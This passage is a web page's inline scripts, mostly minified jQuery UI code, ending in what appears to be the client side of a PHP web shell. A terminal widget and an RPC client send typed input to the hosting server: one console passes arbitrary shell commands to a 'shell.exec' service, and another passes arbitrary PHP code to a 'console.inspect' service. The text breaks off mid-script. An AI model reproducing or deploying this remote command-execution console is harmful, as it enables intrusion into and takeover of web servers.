return this.each(function(){var instance=$.data(this,name);if(isMethodCall&&instance&&$.isFunction(instance[options])){instance[options].apply(instance,args);}else if(!isMethodCall){$.data(this,name,new $[namespace][name](this,options));}});};$[namespace][name]=function(element,options){var self=this;this.widgetName=name;this.widgetBaseClass=namespace+'-'+name;this.options=$.extend({},$.widget.defaults,$[namespace][name].defaults,options);this.element=$(element).bind('setData.'+name,function(e,key,value){return self.setData(key,value);}).bind('getData.'+name,function(e,key){return self.getData(key);}).bind('remove',function(){return self.destroy();});this.init();};$[namespace][name].prototype=$.extend({},$.widget.prototype,prototype);};$.widget.prototype={init:function(){},destroy:function(){this.element.removeData(this.widgetName);},getData:function(key){return this.options[key];},setData:function(key,value){this.options[key]=value;if(key=='disabled'){this.element[value?'addClass':'removeClass'](this.widgetBaseClass+'-disabled');}},enable:function(){this.setData('disabled',false);},disable:function(){this.setData('disabled',true);}};$.widget.defaults={disabled:false};$.ui.mouse={mouseInit:function(){var self=this;this.element.bind('mousedown.'+this.widgetName,function(e){return self.mouseDown(e);});if($.browser.msie){this._mouseUnselectable=this.element.attr('unselectable');this.element.attr('unselectable','on');}
this.started=false;},mouseDestroy:function(){this.element.unbind('.'+this.widgetName);($.browser.msie&&this.element.attr('unselectable',this._mouseUnselectable));},mouseDown:function(e){(this._mouseStarted&&this.mouseUp(e));this._mouseDownEvent=e;var self=this,btnIsLeft=(e.which==1),elIsCancel=(typeof this.options.cancel=="string"?$(e.target).parents().add(e.target).filter(this.options.cancel).length:false);if(!btnIsLeft||elIsCancel||!this.mouseCapture(e)){return true;}
this._mouseDelayMet=!this.options.delay;if(!this._mouseDelayMet){this._mouseDelayTimer=setTimeout(function(){self._mouseDelayMet=true;},this.options.delay);}
if(this.mouseDistanceMet(e)&&this.mouseDelayMet(e)){this._mouseStarted=(this.mouseStart(e)!==false);if(!this._mouseStarted){e.preventDefault();return true;}}
this._mouseMoveDelegate=function(e){return self.mouseMove(e);};this._mouseUpDelegate=function(e){return self.mouseUp(e);};$(document).bind('mousemove.'+this.widgetName,this._mouseMoveDelegate).bind('mouseup.'+this.widgetName,this._mouseUpDelegate);return false;},mouseMove:function(e){if($.browser.msie&&!e.button){return this.mouseUp(e);}
if(this._mouseStarted){this.mouseDrag(e);return false;}
if(this.mouseDistanceMet(e)&&this.mouseDelayMet(e)){this._mouseStarted=(this.mouseStart(this._mouseDownEvent,e)!==false);(this._mouseStarted?this.mouseDrag(e):this.mouseUp(e));}
return!this._mouseStarted;},mouseUp:function(e){$(document).unbind('mousemove.'+this.widgetName,this._mouseMoveDelegate).unbind('mouseup.'+this.widgetName,this._mouseUpDelegate);if(this._mouseStarted){this._mouseStarted=false;this.mouseStop(e);}
return false;},mouseDistanceMet:function(e){return(Math.max(Math.abs(this._mouseDownEvent.pageX-e.pageX),Math.abs(this._mouseDownEvent.pageY-e.pageY))>=this.options.distance);},mouseDelayMet:function(e){return this._mouseDelayMet;},mouseStart:function(e){},mouseDrag:function(e){},mouseStop:function(e){},mouseCapture:function(e){return true;}};$.ui.mouse.defaults={cancel:null,distance:1,delay:0};})(jQuery);(function($){$.widget("ui.tabs",{init:function(){this.options.event+='.tabs';this.tabify(true);},setData:function(key,value){if((/^selected/).test(key))
this.select(value);else{this.options[key]=value;this.tabify();}},length:function(){return this.$tabs.length;},tabId:function(a){return a.title&&a.title.replace(/\s/g,'_').replace(/[^A-Za-z0-9\-_:\.]/g,'')||this.options.idPrefix+$.data(a);},ui:function(tab,panel){return{options:this.options,tab:tab,panel:panel,index:this.$tabs.index(tab)};},tabify:function(init){this.$lis=$('li:has(a[href])',this.element);this.$tabs=this.$lis.map(function(){return $('a',this)[0];});this.$panels=$([]);var self=this,o=this.options;this.$tabs.each(function(i,a){if(a.hash&&a.hash.replace('#',''))
self.$panels=self.$panels.add(a.hash);else if($(a).attr('href')!='#'){$.data(a,'href.tabs',a.href);$.data(a,'load.tabs',a.href);var id=self.tabId(a);a.href='#'+id;var $panel=$('#'+id);if(!$panel.length){$panel=$(o.panelTemplate).attr('id',id).addClass(o.panelClass).insertAfter(self.$panels[i-1]||self.element);$panel.data('destroy.tabs',true);}
self.$panels=self.$panels.add($panel);}
else
o.disabled.push(i+1);});if(init){this.element.addClass(o.navClass);this.$panels.each(function(){var $this=$(this);$this.addClass(o.panelClass);});if(o.selected===undefined){if(location.hash){this.$tabs.each(function(i,a){if(a.hash==location.hash){o.selected=i;if($.browser.msie||$.browser.opera){var $toShow=$(location.hash),toShowId=$toShow.attr('id');$toShow.attr('id','');setTimeout(function(){$toShow.attr('id',toShowId);},500);}
scrollTo(0,0);return false;}});}
else if(o.cookie){var index=parseInt($.cookie('ui-tabs'+$.data(self.element)),10);if(index&&self.$tabs[index])
o.selected=index;}
else if(self.$lis.filter('.'+o.selectedClass).length)
o.selected=self.$lis.index(self.$lis.filter('.'+o.selectedClass)[0]);}
o.selected=o.selected===null||o.selected!==undefined?o.selected:0;o.disabled=$.unique(o.disabled.concat($.map(this.$lis.filter('.'+o.disabledClass),function(n,i){return self.$lis.index(n);}))).sort();if($.inArray(o.selected,o.disabled)!=-1)
o.disabled.splice($.inArray(o.selected,o.disabled),1);this.$panels.addClass(o.hideClass);this.$lis.removeClass(o.selectedClass);if(o.selected!==null){this.$panels.eq(o.selected).show().removeClass(o.hideClass);this.$lis.eq(o.selected).addClass(o.selectedClass);var onShow=function(){$(self.element).triggerHandler('tabsshow',[self.fakeEvent('tabsshow'),self.ui(self.$tabs[o.selected],self.$panels[o.selected])],o.show);};if($.data(this.$tabs[o.selected],'load.tabs'))
this.load(o.selected,onShow);else
onShow();}
$(window).bind('unload',function(){self.$tabs.unbind('.tabs');self.$lis=self.$tabs=self.$panels=null;});}
for(var i=0,li;li=this.$lis[i];i++)
$(li)[$.inArray(i,o.disabled)!=-1&&!$(li).hasClass(o.selectedClass)?'addClass':'removeClass'](o.disabledClass);if(o.cache===false)
this.$tabs.removeData('cache.tabs');var hideFx,showFx,baseFx={'min-width':0,duration:1},baseDuration='normal';if(o.fx&&o.fx.constructor==Array)
hideFx=o.fx[0]||baseFx,showFx=o.fx[1]||baseFx;else
hideFx=showFx=o.fx||baseFx;var resetCSS={display:'',overflow:'',height:''};if(!$.browser.msie)
resetCSS.opacity='';function hideTab(clicked,$hide,$show){$hide.animate(hideFx,hideFx.duration||baseDuration,function(){$hide.addClass(o.hideClass).css(resetCSS);if($.browser.msie&&hideFx.opacity)
$hide[0].style.filter='';if($show)
showTab(clicked,$show,$hide);});}
function showTab(clicked,$show,$hide){if(showFx===baseFx)
$show.css('display','block');$show.animate(showFx,showFx.duration||baseDuration,function(){$show.removeClass(o.hideClass).css(resetCSS);if($.browser.msie&&showFx.opacity)
$show[0].style.filter='';$(self.element).triggerHandler('tabsshow',[self.fakeEvent('tabsshow'),self.ui(clicked,$show[0])],o.show);});}
function switchTab(clicked,$li,$hide,$show){$li.addClass(o.selectedClass).siblings().removeClass(o.selectedClass);hideTab(clicked,$hide,$show);}
this.$tabs.unbind('.tabs').bind(o.event,function(){var $li=$(this).parents('li:eq(0)'),$hide=self.$panels.filter(':visible'),$show=$(this.hash);if(($li.hasClass(o.selectedClass)&&!o.unselect)||$li.hasClass(o.disabledClass)||$(this).hasClass(o.loadingClass)||$(self.element).triggerHandler('tabsselect',[self.fakeEvent('tabsselect'),self.ui(this,$show[0])],o.select)===false){this.blur();return false;}
self.options.selected=self.$tabs.index(this);if(o.unselect){if($li.hasClass(o.selectedClass)){self.options.selected=null;$li.removeClass(o.selectedClass);self.$panels.stop();hideTab(this,$hide);this.blur();return false;}else if(!$hide.length){self.$panels.stop();var a=this;self.load(self.$tabs.index(this),function(){$li.addClass(o.selectedClass).addClass(o.unselectClass);showTab(a,$show);});this.blur();return false;}}
if(o.cookie)
$.cookie('ui-tabs'+$.data(self.element),self.options.selected,o.cookie);self.$panels.stop();if($show.length){var a=this;self.load(self.$tabs.index(this),$hide.length?function(){switchTab(a,$li,$hide,$show);}:function(){$li.addClass(o.selectedClass);showTab(a,$show);});}else
throw'jQuery UI Tabs: Mismatching fragment identifier.';if($.browser.msie)
this.blur();return false;});if(!(/^click/).test(o.event))
this.$tabs.bind('click.tabs',function(){return false;});},add:function(url,label,index){if(index==undefined)
index=this.$tabs.length;var o=this.options;var $li=$(o.tabTemplate.replace(/#\{href\}/g,url).replace(/#\{label\}/g,label));$li.data('destroy.tabs',true);var id=url.indexOf('#')==0?url.replace('#',''):this.tabId($('a:first-child',$li)[0]);var $panel=$('#'+id);if(!$panel.length){$panel=$(o.panelTemplate).attr('id',id).addClass(o.hideClass).data('destroy.tabs',true);}
$panel.addClass(o.panelClass);if(index>=this.$lis.length){$li.appendTo(this.element);$panel.appendTo(this.element[0].parentNode);}else{$li.insertBefore(this.$lis[index]);$panel.insertBefore(this.$panels[index]);}
o.disabled=$.map(o.disabled,function(n,i){return n>=index?++n:n});this.tabify();if(this.$tabs.length==1){$li.addClass(o.selectedClass);$panel.removeClass(o.hideClass);var href=$.data(this.$tabs[0],'load.tabs');if(href)
this.load(index,href);}
this.element.triggerHandler('tabsadd',[this.fakeEvent('tabsadd'),this.ui(this.$tabs[index],this.$panels[index])],o.add);},remove:function(index){var o=this.options,$li=this.$lis.eq(index).remove(),$panel=this.$panels.eq(index).remove();if($li.hasClass(o.selectedClass)&&this.$tabs.length>1)
this.select(index+(index+1<this.$tabs.length?1:-1));o.disabled=$.map($.grep(o.disabled,function(n,i){return n!=index;}),function(n,i){return n>=index?--n:n});this.tabify();this.element.triggerHandler('tabsremove',[this.fakeEvent('tabsremove'),this.ui($li.find('a')[0],$panel[0])],o.remove);},enable:function(index){var o=this.options;if($.inArray(index,o.disabled)==-1)
return;var $li=this.$lis.eq(index).removeClass(o.disabledClass);if($.browser.safari){$li.css('display','inline-block');setTimeout(function(){$li.css('display','block');},0);}
o.disabled=$.grep(o.disabled,function(n,i){return n!=index;});this.element.triggerHandler('tabsenable',[this.fakeEvent('tabsenable'),this.ui(this.$tabs[index],this.$panels[index])],o.enable);},disable:function(index){var self=this,o=this.options;if(index!=o.selected){this.$lis.eq(index).addClass(o.disabledClass);o.disabled.push(index);o.disabled.sort();this.element.triggerHandler('tabsdisable',[this.fakeEvent('tabsdisable'),this.ui(this.$tabs[index],this.$panels[index])],o.disable);}},select:function(index){if(typeof index=='string')
index=this.$tabs.index(this.$tabs.filter('[href$='+index+']')[0]);this.$tabs.eq(index).trigger(this.options.event);},load:function(index,callback){var self=this,o=this.options,$a=this.$tabs.eq(index),a=$a[0],bypassCache=callback==undefined||callback===false,url=$a.data('load.tabs');callback=callback||function(){};if(!url||!bypassCache&&$.data(a,'cache.tabs')){callback();return;}
var inner=function(parent){var $parent=$(parent),$inner=$parent.find('*:last');return $inner.length&&$inner.is(':not(img)')&&$inner||$parent;};var cleanup=function(){self.$tabs.filter('.'+o.loadingClass).removeClass(o.loadingClass).each(function(){if(o.spinner)
inner(this).parent().html(inner(this).data('label.tabs'));});self.xhr=null;};if(o.spinner){var label=inner(a).html();inner(a).wrapInner('<em></em>').find('em').data('label.tabs',label).html(o.spinner);}
var ajaxOptions=$.extend({},o.ajaxOptions,{url:url,success:function(r,s){$(a.hash).html(r);cleanup();if(o.cache)
$.data(a,'cache.tabs',true);$(self.element).triggerHandler('tabsload',[self.fakeEvent('tabsload'),self.ui(self.$tabs[index],self.$panels[index])],o.load);o.ajaxOptions.success&&o.ajaxOptions.success(r,s);callback();}});if(this.xhr){this.xhr.abort();cleanup();}
$a.addClass(o.loadingClass);setTimeout(function(){self.xhr=$.ajax(ajaxOptions);},0);},url:function(index,url){this.$tabs.eq(index).removeData('cache.tabs').data('load.tabs',url);},destroy:function(){var o=this.options;this.element.unbind('.tabs').removeClass(o.navClass).removeData('tabs');this.$tabs.each(function(){var href=$.data(this,'href.tabs');if(href)
this.href=href;var $this=$(this).unbind('.tabs');$.each(['href','load','cache'],function(i,prefix){$this.removeData(prefix+'.tabs');});});this.$lis.add(this.$panels).each(function(){if($.data(this,'destroy.tabs'))
$(this).remove();else
$(this).removeClass([o.selectedClass,o.unselectClass,o.disabledClass,o.panelClass,o.hideClass].join(' '));});},fakeEvent:function(type){return $.event.fix({type:type,target:this.element[0]});}});$.ui.tabs.defaults={unselect:false,event:'click',disabled:[],cookie:null,spinner:'Loading&#8230;',cache:false,idPrefix:'ui-tabs-',ajaxOptions:{},fx:null,tabTemplate:'<li><a href="#{href}"><span>#{label}</span></a></li>',panelTemplate:'<div></div>',navClass:'ui-tabs-nav',selectedClass:'ui-tabs-selected',unselectClass:'ui-tabs-unselect',disabledClass:'ui-tabs-disabled',panelClass:'ui-tabs-panel',hideClass:'ui-tabs-hide',loadingClass:'ui-tabs-loading'};$.ui.tabs.getter="length";$.extend($.ui.tabs.prototype,{rotation:null,rotate:function(ms,continuing){continuing=continuing||false;var self=this,t=this.options.selected;function start(){self.rotation=setInterval(function(){t=++t<self.$tabs.length?t:0;self.select(t);},ms);}
function stop(e){if(!e||e.clientX){clearInterval(self.rotation);}}
if(ms){start();if(!continuing)
this.$tabs.bind(this.options.event,stop);else
this.$tabs.bind(this.options.event,function(){stop();t=self.options.selected;start();});}
else{stop();this.$tabs.unbind(this.options.event,stop);}}});})(jQuery);;(function($){$.effects=$.effects||{};$.extend($.effects,{save:function(el,set){for(var i=0;i<set.length;i++){if(set[i]!==null)$.data(el[0],"ec.storage."+set[i],el[0].style[set[i]]);}},restore:function(el,set){for(var i=0;i<set.length;i++){if(set[i]!==null)el.css(set[i],$.data(el[0],"ec.storage."+set[i]));}},setMode:function(el,mode){if(mode=='toggle')mode=el.is(':hidden')?'show':'hide';return mode;},getBaseline:function(origin,original){var y,x;switch(origin[0]){case'top':y=0;break;case'middle':y=0.5;break;case'bottom':y=1;break;default:y=origin[0]/original.height;};switch(origin[1]){case'left':x=0;break;case'center':x=0.5;break;case'right':x=1;break;default:x=origin[1]/original.width;};return{x:x,y:y};},createWrapper:function(el){if(el.parent().attr('id')=='fxWrapper')
return el;var props={width:el.outerWidth({margin:true}),height:el.outerHeight({margin:true}),'float':el.css('float')};el.wrap('<div id="fxWrapper" style="font-size:100%;background:transparent;border:none;margin:0;padding:0"></div>');var wrapper=el.parent();if(el.css('position')=='static'){wrapper.css({position:'relative'});el.css({position:'relative'});}else{var top=el.css('top');if(isNaN(parseInt(top)))top='auto';var left=el.css('left');if(isNaN(parseInt(left)))left='auto';wrapper.css({position:el.css('position'),top:top,left:left,zIndex:el.css('z-index')}).show();el.css({position:'relative',top:0,left:0});}
wrapper.css(props);return wrapper;},removeWrapper:function(el){if(el.parent().attr('id')=='fxWrapper')
return el.parent().replaceWith(el);return el;},setTransition:function(el,list,factor,val){val=val||{};$.each(list,function(i,x){unit=el.cssUnit(x);if(unit[0]>0)val[x]=unit[0]*factor+unit[1];});return val;},animateClass:function(value,duration,easing,callback){var cb=(typeof easing=="function"?easing:(callback?callback:null));var ea=(typeof easing=="object"?easing:null);return this.each(function(){var offset={};var that=$(this);var oldStyleAttr=that.attr("style")||'';if(typeof oldStyleAttr=='object')oldStyleAttr=oldStyleAttr["cssText"];if(value.toggle){that.hasClass(value.toggle)?value.remove=value.toggle:value.add=value.toggle;}
var oldStyle=$.extend({},(document.defaultView?document.defaultView.getComputedStyle(this,null):this.currentStyle));if(value.add)that.addClass(value.add);if(value.remove)that.removeClass(value.remove);var newStyle=$.extend({},(document.defaultView?document.defaultView.getComputedStyle(this,null):this.currentStyle));if(value.add)that.removeClass(value.add);if(value.remove)that.addClass(value.remove);for(var n in newStyle){if(typeof newStyle[n]!="function"&&newStyle[n]&&n.indexOf("Moz")==-1&&n.indexOf("length")==-1&&newStyle[n]!=oldStyle[n]&&(n.match(/color/i)||(!n.match(/color/i)&&!isNaN(parseInt(newStyle[n],10))))&&(oldStyle.position!="static"||(oldStyle.position=="static"&&!n.match(/left|top|bottom|right/))))offset[n]=newStyle[n];}
that.animate(offset,duration,ea,function(){if(typeof $(this).attr("style")=='object'){$(this).attr("style")["cssText"]="";$(this).attr("style")["cssText"]=oldStyleAttr;}else $(this).attr("style",oldStyleAttr);if(value.add)$(this).addClass(value.add);if(value.remove)$(this).removeClass(value.remove);if(cb)cb.apply(this,arguments);});});}});$.fn.extend({_show:$.fn.show,_hide:$.fn.hide,__toggle:$.fn.toggle,_addClass:$.fn.addClass,_removeClass:$.fn.removeClass,_toggleClass:$.fn.toggleClass,effect:function(fx,o,speed,callback){return $.effects[fx]?$.effects[fx].call(this,{method:fx,options:o||{},duration:speed,callback:callback}):null;},show:function(){if(!arguments[0]||(arguments[0].constructor==Number||/(slow|normal|fast)/.test(arguments[0])))
return this._show.apply(this,arguments);else{var o=arguments[1]||{};o['mode']='show';return this.effect.apply(this,[arguments[0],o,arguments[2]||o.duration,arguments[3]||o.callback]);}},hide:function(){if(!arguments[0]||(arguments[0].constructor==Number||/(slow|normal|fast)/.test(arguments[0])))
return this._hide.apply(this,arguments);else{var o=arguments[1]||{};o['mode']='hide';return this.effect.apply(this,[arguments[0],o,arguments[2]||o.duration,arguments[3]||o.callback]);}},toggle:function(){if(!arguments[0]||(arguments[0].constructor==Number||/(slow|normal|fast)/.test(arguments[0]))||(arguments[0].constructor==Function))
return this.__toggle.apply(this,arguments);else{var o=arguments[1]||{};o['mode']='toggle';return this.effect.apply(this,[arguments[0],o,arguments[2]||o.duration,arguments[3]||o.callback]);}},addClass:function(classNames,speed,easing,callback){return speed?$.effects.animateClass.apply(this,[{add:classNames},speed,easing,callback]):this._addClass(classNames);},removeClass:function(classNames,speed,easing,callback){return speed?$.effects.animateClass.apply(this,[{remove:classNames},speed,easing,callback]):this._removeClass(classNames);},toggleClass:function(classNames,speed,easing,callback){return speed?$.effects.animateClass.apply(this,[{toggle:classNames},speed,easing,callback]):this._toggleClass(classNames);},morph:function(remove,add,speed,easing,callback){return $.effects.animateClass.apply(this,[{add:add,remove:remove},speed,easing,callback]);},switchClass:function(){return this.morph.apply(this,arguments);},cssUnit:function(key){var style=this.css(key),val=[];$.each(['em','px','%','pt'],function(i,unit){if(style.indexOf(unit)>0)
val=[parseFloat(style),unit];});return val;}});jQuery.each(['backgroundColor','borderBottomColor','borderLeftColor','borderRightColor','borderTopColor','color','outlineColor'],function(i,attr){jQuery.fx.step[attr]=function(fx){if(fx.state==0){fx.start=getColor(fx.elem,attr);fx.end=getRGB(fx.end);}
fx.elem.style[attr]="rgb("+[Math.max(Math.min(parseInt((fx.pos*(fx.end[0]-fx.start[0]))+fx.start[0]),255),0),Math.max(Math.min(parseInt((fx.pos*(fx.end[1]-fx.start[1]))+fx.start[1]),255),0),Math.max(Math.min(parseInt((fx.pos*(fx.end[2]-fx.start[2]))+fx.start[2]),255),0)].join(",")+")";}});function getRGB(color){var result;if(color&&color.constructor==Array&&color.length==3)
return color;if(result=/rgb\(\s*([0-9]{1,3})\s*,\s*([0-9]{1,3})\s*,\s*([0-9]{1,3})\s*\)/.exec(color))
return[parseInt(result[1]),parseInt(result[2]),parseInt(result[3])];if(result=/rgb\(\s*([0-9]+(?:\.[0-9]+)?)\%\s*,\s*([0-9]+(?:\.[0-9]+)?)\%\s*,\s*([0-9]+(?:\.[0-9]+)?)\%\s*\)/.exec(color))
return[parseFloat(result[1])*2.55,parseFloat(result[2])*2.55,parseFloat(result[3])*2.55];if(result=/#([a-fA-F0-9]{2})([a-fA-F0-9]{2})([a-fA-F0-9]{2})/.exec(color))
return[parseInt(result[1],16),parseInt(result[2],16),parseInt(result[3],16)];if(result=/#([a-fA-F0-9])([a-fA-F0-9])([a-fA-F0-9])/.exec(color))
return[parseInt(result[1]+result[1],16),parseInt(result[2]+result[2],16),parseInt(result[3]+result[3],16)];if(result=/rgba\(0, 0, 0, 0\)/.exec(color))
return colors['transparent']
return colors[jQuery.trim(color).toLowerCase()];}
function getColor(elem,attr){var color;do{color=jQuery.curCSS(elem,attr);if(color!=''&&color!='transparent'||jQuery.nodeName(elem,"body"))
break;attr="backgroundColor";}while(elem=elem.parentNode);return getRGB(color);};var colors={aqua:[0,255,255],azure:[240,255,255],beige:[245,245,220],black:[0,0,0],blue:[0,0,255],brown:[165,42,42],cyan:[0,255,255],darkblue:[0,0,139],darkcyan:[0,139,139],darkgrey:[169,169,169],darkgreen:[0,100,0],darkkhaki:[189,183,107],darkmagenta:[139,0,139],darkolivegreen:[85,107,47],darkorange:[255,140,0],darkorchid:[153,50,204],darkred:[139,0,0],darksalmon:[233,150,122],darkviolet:[148,0,211],fuchsia:[255,0,255],gold:[255,215,0],green:[0,128,0],indigo:[75,0,130],khaki:[240,230,140],lightblue:[173,216,230],lightcyan:[224,255,255],lightgreen:[144,238,144],lightgrey:[211,211,211],lightpink:[255,182,193],lightyellow:[255,255,224],lime:[0,255,0],magenta:[255,0,255],maroon:[128,0,0],navy:[0,0,128],olive:[128,128,0],orange:[255,165,0],pink:[255,192,203],purple:[128,0,128],violet:[128,0,128],red:[255,0,0],silver:[192,192,192],white:[255,255,255],yellow:[255,255,0],transparent:[255,255,255]};jQuery.easing['jswing']=jQuery.easing['swing'];jQuery.extend(jQuery.easing,{def:'easeOutQuad',swing:function(x,t,b,c,d){return jQuery.easing[jQuery.easing.def](x,t,b,c,d);},easeInQuad:function(x,t,b,c,d){return c*(t/=d)*t+b;},easeOutQuad:function(x,t,b,c,d){return-c*(t/=d)*(t-2)+b;},easeInOutQuad:function(x,t,b,c,d){if((t/=d/2)<1)return c/2*t*t+b;return-c/2*((--t)*(t-2)-1)+b;},easeInCubic:function(x,t,b,c,d){return c*(t/=d)*t*t+b;},easeOutCubic:function(x,t,b,c,d){return c*((t=t/d-1)*t*t+1)+b;},easeInOutCubic:function(x,t,b,c,d){if((t/=d/2)<1)return c/2*t*t*t+b;return c/2*((t-=2)*t*t+2)+b;},easeInQuart:function(x,t,b,c,d){return c*(t/=d)*t*t*t+b;},easeOutQuart:function(x,t,b,c,d){return-c*((t=t/d-1)*t*t*t-1)+b;},easeInOutQuart:function(x,t,b,c,d){if((t/=d/2)<1)return c/2*t*t*t*t+b;return-c/2*((t-=2)*t*t*t-2)+b;},easeInQuint:function(x,t,b,c,d){return c*(t/=d)*t*t*t*t+b;},easeOutQuint:function(x,t,b,c,d){return c*((t=t/d-1)*t*t*t*t+1)+b;},easeInOutQuint:function(x,t,b,c,d){if((t/=d/2)<1)return c/2*t*t*t*t*t+b;return c/2*((t-=2)*t*t*t*t+2)+b;},easeInSine:function(x,t,b,c,d){return-c*Math.cos(t/d*(Math.PI/2))+c+b;},easeOutSine:function(x,t,b,c,d){return c*Math.sin(t/d*(Math.PI/2))+b;},easeInOutSine:function(x,t,b,c,d){return-c/2*(Math.cos(Math.PI*t/d)-1)+b;},easeInExpo:function(x,t,b,c,d){return(t==0)?b:c*Math.pow(2,10*(t/d-1))+b;},easeOutExpo:function(x,t,b,c,d){return(t==d)?b+c:c*(-Math.pow(2,-10*t/d)+1)+b;},easeInOutExpo:function(x,t,b,c,d){if(t==0)return b;if(t==d)return b+c;if((t/=d/2)<1)return c/2*Math.pow(2,10*(t-1))+b;return c/2*(-Math.pow(2,-10*--t)+2)+b;},easeInCirc:function(x,t,b,c,d){return-c*(Math.sqrt(1-(t/=d)*t)-1)+b;},easeOutCirc:function(x,t,b,c,d){return c*Math.sqrt(1-(t=t/d-1)*t)+b;},easeInOutCirc:function(x,t,b,c,d){if((t/=d/2)<1)return-c/2*(Math.sqrt(1-t*t)-1)+b;return c/2*(Math.sqrt(1-(t-=2)*t)+1)+b;},easeInElastic:function(x,t,b,c,d){var s=1.70158;var p=0;var a=c;if(t==0)return b;if((t/=d)==1)return b+c;if(!p)p=d*.3;if(a<Math.abs(c)){a=c;var s=p/4;}
else var s=p/(2*Math.PI)*Math.asin(c/a);return-(a*Math.pow(2,10*(t-=1))*Math.sin((t*d-s)*(2*Math.PI)/p))+b;},easeOutElastic:function(x,t,b,c,d){var s=1.70158;var p=0;var a=c;if(t==0)return b;if((t/=d)==1)return b+c;if(!p)p=d*.3;if(a<Math.abs(c)){a=c;var s=p/4;}
else var s=p/(2*Math.PI)*Math.asin(c/a);return a*Math.pow(2,-10*t)*Math.sin((t*d-s)*(2*Math.PI)/p)+c+b;},easeInOutElastic:function(x,t,b,c,d){var s=1.70158;var p=0;var a=c;if(t==0)return b;if((t/=d/2)==2)return b+c;if(!p)p=d*(.3*1.5);if(a<Math.abs(c)){a=c;var s=p/4;}
else var s=p/(2*Math.PI)*Math.asin(c/a);if(t<1)return-.5*(a*Math.pow(2,10*(t-=1))*Math.sin((t*d-s)*(2*Math.PI)/p))+b;return a*Math.pow(2,-10*(t-=1))*Math.sin((t*d-s)*(2*Math.PI)/p)*.5+c+b;},easeInBack:function(x,t,b,c,d,s){if(s==undefined)s=1.70158;return c*(t/=d)*t*((s+1)*t-s)+b;},easeOutBack:function(x,t,b,c,d,s){if(s==undefined)s=1.70158;return c*((t=t/d-1)*t*((s+1)*t+s)+1)+b;},easeInOutBack:function(x,t,b,c,d,s){if(s==undefined)s=1.70158;if((t/=d/2)<1)return c/2*(t*t*(((s*=(1.525))+1)*t-s))+b;return c/2*((t-=2)*t*(((s*=(1.525))+1)*t+s)+2)+b;},easeInBounce:function(x,t,b,c,d){return c-jQuery.easing.easeOutBounce(x,d-t,0,c,d)+b;},easeOutBounce:function(x,t,b,c,d){if((t/=d)<(1/2.75)){return c*(7.5625*t*t)+b;}else if(t<(2/2.75)){return c*(7.5625*(t-=(1.5/2.75))*t+.75)+b;}else if(t<(2.5/2.75)){return c*(7.5625*(t-=(2.25/2.75))*t+.9375)+b;}else{return c*(7.5625*(t-=(2.625/2.75))*t+.984375)+b;}},easeInOutBounce:function(x,t,b,c,d){if(t<d/2)return jQuery.easing.easeInBounce(x,t*2,0,c,d)*.5+b;return jQuery.easing.easeOutBounce(x,t*2-d,0,c,d)*.5+c*.5+b;}});})(jQuery);(function($){$.effects.blind=function(o){return this.queue(function(){var el=$(this),props=['position','top','left'];var mode=$.effects.setMode(el,o.options.mode||'hide');var direction=o.options.direction||'vertical';$.effects.save(el,props);el.show();var wrapper=$.effects.createWrapper(el).css({overflow:'hidden'});var ref=(direction=='vertical')?'height':'width';var distance=(direction=='vertical')?wrapper.height():wrapper.width();if(mode=='show')wrapper.css(ref,0);var animation={};animation[ref]=mode=='show'?distance:0;wrapper.animate(animation,o.duration,o.options.easing,function(){if(mode=='hide')el.hide();$.effects.restore(el,props);$.effects.removeWrapper(el);if(o.callback)o.callback.apply(el[0],arguments);el.dequeue();});});};})(jQuery);</script>
    <script type="text/javascript">
(function($){$.fn.terminal=function(callback){var obj=$(this);var output=$('<textarea></textarea><br />');var input=$('<input />');output.addClass('terminal_textarea');output.attr({cols:100,rows:25,readonly:true});input.addClass('terminal_textarea');input.attr({size:103,value:''});obj.append(output);obj.append(input);input.keypress(function(e){if(e.which==13)
{var data=$.trim(input.val());if(data.length>0)
{callback(data);}
input.val('');}});};$.fn.terminalFocus=function(){return this.each(function(){$("input.terminal_textarea",this).focus();});};$.fn.terminalClear=function(){return this.each(function(){$("textarea.terminal_textarea",this).val('');});};jQuery.fn.terminalPrint=function(message){return this.each(function(){var output=$("textarea.terminal_textarea",this);output.val(output.val()+message);output.attr('scrollTop',output.attr('scrollHeight'));});};jQuery.fn.terminalPrintLine=function(message){return this.terminalPrint(message+"\n");};})(jQuery);</script>
    <script type="text/javascript">
var PHP_RPC={Request:{encode:function(method,args){return base64.encode(MessagePack.pack({'name':method,'arguments':args,'state':PHP_RPC.state}));}},Response:{valid_types:{'error':true,'return':true},valid_keys:{'error':['message'],'return':['state','output','return_value']},decode:function(page){var extractor=new RegExp("<rpc-response>(.*)<\/rpc-response>");var match=page.match(extractor);if(match==null||match[1]==null||match[1].length==0)
{throw"PHP-RPC Response missing";}
var response=MessagePack.unpack(base64.decode(match[1]));if(response==null)
{throw"Invalid PHP-RPC Response";}
if(response['type']==null||!(response['type']in PHP_RPC.Response.valid_types))
{throw"Invalid PHP-RPC Response type";}
var check_keys=PHP_RPC.Response.valid_keys[response['type']];for(var i=0;i<check_keys.length;i++)
{if(response[check_keys[i]]==null)
{throw"PHP-RPC Response is missing the "+check_keys[i]+" key";}}
return response;}},serverURL:window.location.href,requestMethod:'GET',state:{},callURL:function(method,args){var url=PHP_RPC.serverURL;if(url.indexOf('?')==-1)
{url+='?';}
else if(url[url.length-1]!='&')
{url+='&';}
var request=PHP_RPC.Request.encode(method,args);url+=('rpcrequest='+encodeURIComponent(request));return url;},call:function(method,args,callback){var url=PHP_RPC.callURL(method,args);jQuery.ajax({url:url,type:PHP_RPC.requestMethod,success:function(data){var response=PHP_RPC.Response.decode(data);if(response['type']=='error')
{throw response['message'];}
PHP_RPC.state=response['state'];callback(response);}});},callService:function(service,method,args,callback){PHP_RPC.call(service+'.'+method,args,callback);}};</script>
    <script type="text/javascript">
var Shell={clear:function(){$("#console_shell").terminalClear();},print:function(message){$("#console_shell").terminalPrint(message);},exec:function(command){PHP_RPC.callService('shell','exec',new Array(command),function(output){if(output.error!=null)
{Shell.print(output.error);}
else
{var text='$ '+command+"\n";if(output.returnValue!=null&&output.returnValue.length>0)
{text+=output.returnValue;}
Shell.print(text);}});}};var PHP={clear:function(){$("#console_php").terminalClear();},print:function(message){$("#console_php").terminalPrint(message);},inspect:function(code){PHP_RPC.callService('console','inspect',new Array(code),function(response){if(response.error!=null)
{PHP.print(response.error);}
else
{var text='>> '+code+"\n";if(response.output!=null)
{text=text+response.output;}
PHP.print(text+"=> "+response.returnValue+"\n");}});}};</script>
    <script type="text/javascript">
      $(document).ready(function() {
        $("#console_shell").terminal(function(input) {
          Shell.exec(input);
        });

        $("#console_php").terminal(function(input) {
          PHP.inspect(input);
        });

